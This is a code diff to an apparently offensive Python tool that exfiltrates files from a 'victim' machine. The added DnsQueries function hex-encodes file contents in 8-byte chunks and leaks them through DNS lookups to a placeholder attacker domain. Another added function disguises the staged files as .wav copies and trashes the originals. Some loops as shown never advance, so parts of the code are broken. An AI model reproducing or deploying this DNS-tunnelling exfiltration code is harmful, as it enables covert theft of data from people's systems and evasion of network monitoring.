@@ -186,8 +186,34 @@ def victimTCP():
         print ("File Exfiltrated")
         NFI+=1
     soc.close()
+DNSADDR = ".insertdomainname.com"
+def DnsQueries():
+    global numBytes, numExfilFiles, numFiles, dT, eD, flg,gpath
+    queryNumber = 0
+    fnum=1
+    while fnum<=numExfilFiles:
+        transferFile = open(gpath+"\\X"+str(fnum)+"combinedExfil.txt", 'rb')
+        while True:
+            data = transferFile.read(8)
+            if data:
+                payload = struct.pack('L8s', queryNumber, data)
+                print(payload)
+                EncodedPayload=binascii.hexlify(payload)
+                queryNumber+=1
+                print(str((EncodedPayload.decode("utf-8"))) + DNSADDR)
+                socket.gethostbyname(EncodedPayload.decode("utf-8")+ DNSADDR)
+            else:
+                print ("Either this file's exfil is now complete or has failed terribly!")
+                transferFile.close()
+                break
+        fnum+=1
 def extensionchange():
-    wavT=open("x")
+    global numExfilFiles, numFiles, dT, eD,gpath
+    currentFile=0
+    while currentFile<=numFiles:
+        shutil.copy2(gpath+"\\"+str(currentFile)+"combinedExfil.txt", gpath+"\\X"+str(currentFile)+"combinedExfil.txt.wav")#There are modules for reading wav files, have not added wav exfil support if reading file is required
+        send2trash(gpath+"\\"+str(currentFile)+"combinedExfil.txt")
+    numExfilFiles=numFiles
 def SFTP():
     port = 2222
     hostname="demo.wftpserver.com"
@@ -504,7 +530,7 @@ def keepAsIs():
     global numExfilFiles, numFiles, dT, eD,gpath
     currentFile=0
     while currentFile<=numFiles:
-        shutil.copy2(source, gpath+"\\X"+str(currentFile)+"combinedExfil.txt")
+        shutil.copy2(gpath+"\\"+str(currentFile)+"combinedExfil.txt", gpath+"\\X"+str(currentFile)+"combinedExfil.txt")
     numExfilFiles=numFiles
 
 def dataTransformationMethod(path, s, name, spaces):
